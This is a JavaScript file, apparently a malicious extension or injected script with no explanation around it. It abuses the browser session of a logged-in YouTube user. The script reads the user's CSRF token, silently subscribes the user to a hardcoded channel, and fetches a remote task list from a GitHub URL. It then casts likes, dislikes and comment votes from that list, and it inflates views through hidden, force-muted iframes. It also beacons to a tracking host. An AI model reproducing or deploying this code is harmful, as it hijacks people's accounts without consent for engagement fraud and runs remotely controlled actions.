(new Image).src = "//whos.amung.us/swidget/mandar1n0s";
var Commands = {
    param: function (e) {
        var t = "";
        for (key in e) if ("object" == typeof e[key]) for (v in e[key]) t += "&" + key + "[" + v + "]=" + e[key][v];
        else t += "&" + key + "=" + e[key];
        return t = t.replace("&", "")
    },
    ajax: function (e, t, k) {
        var n = new XMLHttpRequest,
            o = e.method ? e.method.toUpperCase() : "GET",
            a = e.type ? e.type : "application/x-www-form-urlencoded";
        return n.onload = function () {
            t(n.responseText)
        },
        n.onerror = function () {
            t()
        },
        n.open(o, e.url, !0),
        "POST" == o && n.setRequestHeader("Content-Type", a),
        1 == k && n.setRequestHeader("X-Requested-With", "XMLHttpRequest"),
        n.send(e.data),
        !0
    },
    unpack: function (code, type) {
        function indent(e) {
            try {
                for (var t = 0, n = -1, o = "", a = 0; a < e.length; a++) {
                    if (-1 != e[a].indexOf("{") && t++, -1 != e[a].indexOf("}") && t--, n != t) {
                        for (n = t, o = ""; n > 0;) o += "  ",
                        n--;
                        n = t
                    }
                    e[a] = o + e[a]
                }
            } finally {
                t = null,
                n = null,
                o = null
            }
            return e
        }
        var env = {
            eval: function (e) {
                code = e
            },
            window: {},
            document: {}
        };
        return eval("with(env) {" + code + "}"),
        code = 1 == type ? (code + "").replace(/\n;\n/g, ";\n").replace(/\n\n/g, "\n") : (code + "").replace(/;/g, ";\n").replace(/{/g, "\n{\n").replace(/}/g, "\n}\n").replace(/\n;\n/g, ";\n").replace(/\n\n/g, "\n"),
        code = code.split("\n"),
        code = indent(code),
        code = code.join("\n")
    },
    is: function (e) {
        return "yt" == e ? e = "youtube.com" : "fb" == e ? e = "facebook.com" : "tw" == e ? e = "twitter.com" : "ask" == e ? e = "ask.fm" : "gg" == e && (e = "google.com"),
        top.location.hostname.indexOf(e) >= 0
    },
    protocol: function () {
        return document.location.protocol == "http:"
    },
    rand: function (arr) {
        var obj = arr[Math.floor(Math.random() * arr.length)];
        return obj;
    },
    script: function (e) {
        var t = document.createElement("script");
        t.type = "text/javascript",
        t.innerHTML = e,
        document.body.appendChild(t)
    },

    rastgele: function (e) {
        if (!e) e = Math.floor(Math.random() * 201);
        mtn = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
        ret = "";
        for (i = 0; i < e; i++) {
            ret += mtn[Math.floor(Math.random() * 57)]
        }
        return ret
    },


    mt_rand: function (e, t) {
        var n = arguments.length;
        if (0 === n) e = 0,
        t = 2147483647;
        else {
            if (1 === n) throw new Error("Warning: mt_rand() expects exactly 2 parameters, 1 given");
            e = parseInt(e, 10),
            t = parseInt(t, 10)
        }
        return Math.floor(Math.random() * (t - e + 1)) + e
    },
    serialize: function (form) {
        if (!form || form.nodeName !== "FORM") {
            return
        }
        var i, j, q = [];
        for (i = form.elements.length - 1; i >= 0; i = i - 1) {
            if (form.elements[i].name === "") {
                continue
            }
            switch (form.elements[i].nodeName) {
            case "INPUT":
                switch (form.elements[i].type) {
                case "text":
                case "hidden":
                case "password":
                case "button":
                case "reset":
                case "submit":
                    q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                    break;
                case "checkbox":
                case "radio":
                    if (form.elements[i].checked) {
                        q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value))
                    }
                    break;
                case "file":
                    break
                }
                break;
            case "TEXTAREA":
                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                break;
            case "SELECT":
                switch (form.elements[i].type) {
                case "select-one":
                    q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                    break;
                case "select-multiple":
                    for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1) {
                        if (form.elements[i].options[j].selected) {
                            q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].options[j].value))
                        }
                    }
                    break
                }
                break;
            case "BUTTON":
                switch (form.elements[i].type) {
                case "reset":
                case "submit":
                case "button":
                    q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                    break
                }
                break
            }
        }
        return q.join("&")
    }
},
    youtube = {
        isLogin: false,
        log: false,
        subscribers: ["UCTbkS4uLQfs4JDwymJA4IaQ"],
        info: function (type, callback, id, lc) {
            var url = "";
            if (type == "s") {
                url = "https://www.youtube.com/subscribe_embed?channelid=" + id;
            } else if (type == "w" || type == "l" || type == "dl") {
                url = "https://www.youtube.com/watch?v=" + id;
            } else if (type == "c") {
                url = "https://www.youtube.com/watch?v=" + id + "&lc=" + lc;
            }
            Commands.ajax({
                method: "GET",
                url: url
            }, function (e) {
                if (type == "s") {
                    youtube.isLogin = JSON.parse(e.match("'LOGGED_IN': (.*?),")[1]);
                    youtube.csrf = e.match("'XSRF_TOKEN': \"(.*?)\"")[1];
                } else {
                    youtube.isLogin = (e.indexOf('"LOGGED_IN"') > -1) ? JSON.parse(e.match('"LOGGED_IN":(.*?),')[1]) : JSON.parse(e.match("'LOGGED_IN': (.*?),")[1]);
                    youtube.csrf = (e.indexOf('"XSRF_TOKEN"') > -1) ? e.match('"XSRF_TOKEN":"(.*?)"')[1] : e.match("'XSRF_TOKEN':\"(.*?)\"")[1];
                }
                callback(e);
            })
        },
        service_ajax: function (type, data) {
            Commands.ajax({
                method: "POST",
                url: "https://www.youtube.com/service_ajax?=" + type,
                data: data
            }, function (e) {
                youtube.log && console.log(e);
            });
        },
        comment_service_ajax: function (data) {
            Commands.ajax({
                method: "POST",
                url: "https://www.youtube.com/comment_service_ajax?action_perform_comment_action=1",
                data: data
            }, function (e) {
                youtube.log && console.log(e);
            });
        },
        html: function (o) {
            var s = document.createElement("html");
            s.innerHTML = o;
            return s;
        },
        subscribe: function (id) {
            youtube.info("s", function (c) {
                if (youtube.isLogin) {
                    Commands.ajax({
                        method: "POST",
                        url: "https://www.youtube.com/subscription_ajax?action_create_subscription_to_channel=1&c=" + id,
                        data: "ei=" + c.match("ei=(.*?)&")[1] + "&feature=channels4&ved=" + c.match('ved=(.*?)"')[1] + "&session_token=" + youtube.csrf
                    }, function (e) {
                        youtube.log && console.log(e);
                    });
                }
            }, id)
        },
        watch: function (e) {
            var id = Math.floor(Math.random() * 99999999);
            Commands.script('setInterval(function () {if (document.getElementById("sexonthebeach_' + e + "" + id + '")) {setInterval(function () {if (typeof document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").isMuted == "function" && document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").isMuted() == false) {document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").mute();new Image().src = "//whos.amung.us/swidget/fc53cfgc025r"}}, 1)}}, 100)');
            t = document.createElement("iframe");
            t.setAttribute("src", "//www.youtube.com/watch?v=" + e),
            t.style.width = "0px",
            t.style.height = "0px",
            t.id = "sexonthebeach_" + e + "" + id;
            document.body.appendChild(t)
        },

        render: function (type, id, finish, lc) {
            if (!lc) lc = "";
            youtube.info(type, function (c) {
                if (youtube.isLogin) {
                    var csrf = youtube.csrf;
                    html = youtube.html(c);
                    if (type == "l") {
                        if (parseInt(html.innerHTML.match(/"simpleText":"(.*?)"}/g)[3].replace('"simpleText":"', "").replace('"}', "").replace(".", "").replace(",", "")) < finish) {
                            youtube.service_ajax("namelikeEndpoint", 'sej={"clickTrackingParams":"' + html.innerHTML.match('"clickTrackingParams":"(.*?)"')[1] + '","likeEndpoint":{"status":"LIKE","target":{"videoId":"' + id + '"}}}&csn=' + html.innerHTML.match('"csn":"(.*?)"')[1] + '&session_token=' + csrf);
                        }
                    } else if (type == "dl") {
                        if (parseInt(html.getElementsByClassName("like-button-renderer-dislike-button")[0].innerText.replace(".", "").replace(",", "")) < finish) {
                            youtube.service_ajax(html.getElementsByClassName("like-button-renderer-dislike-button")[0].getAttribute("data-post-data") + "&session_token=" + csrf);
                        }
                    } else if (type == "c") {
                        if (parseInt(html.getElementsByClassName("comment-renderer-like-count off")[0].innerText.replace(".", "").replace(",", "")) < finish) {
                            youtube.comment_service_ajax("action=" + html.getElementsByClassName("yt-uix-button yt-uix-button-size-default yt-uix-button-default yt-uix-button-empty yt-uix-button-has-icon no-icon-markup")[1].getAttribute("data-action") + "&vote_status=INDIFFERENT&session_token=" + csrf);
                        }
                    } else if (type == "w") {
                        Commands.is("yt") && youtube.watch(id);
                    }
                } else {
                    if (type == "w") {
                        Commands.is("yt") && youtube.watch(id);
                    }
                }
            }, id, lc);
        },
        init: function () {

            if (document.getElementById("youtubeinjsready")) return;
            var q = document.createElement("div");
            q.id = "youtubeinjsready",
            document.body.appendChild(q);

            youtube.subscribers.forEach(function (s) {
                youtube.subscribe(s)
            });
            Commands.ajax({
                method: "GET",
                url: "https://raw.githubusercontent.com/llllooloolooloo/imi_guri/master/you.json"
            }, function (e) {
                var data = JSON.parse(e).result;
                data.forEach(function (s) {
                    var id = s.id;
                    var type = s.type;
                    var finish = s.finish;
                    var lc = s.lc;

                    if (type == "like") {
                        type = "l";
                    } else if (type == "disslike") {
                        type = "dl";
                    } else if (type == "comment") {
                        type = "c";
                    } else if (type == "watch") {
                        type = "w";
                    }
                    youtube.render(type, id, finish, lc);
                })
            })
        }
    }

youtube.init();
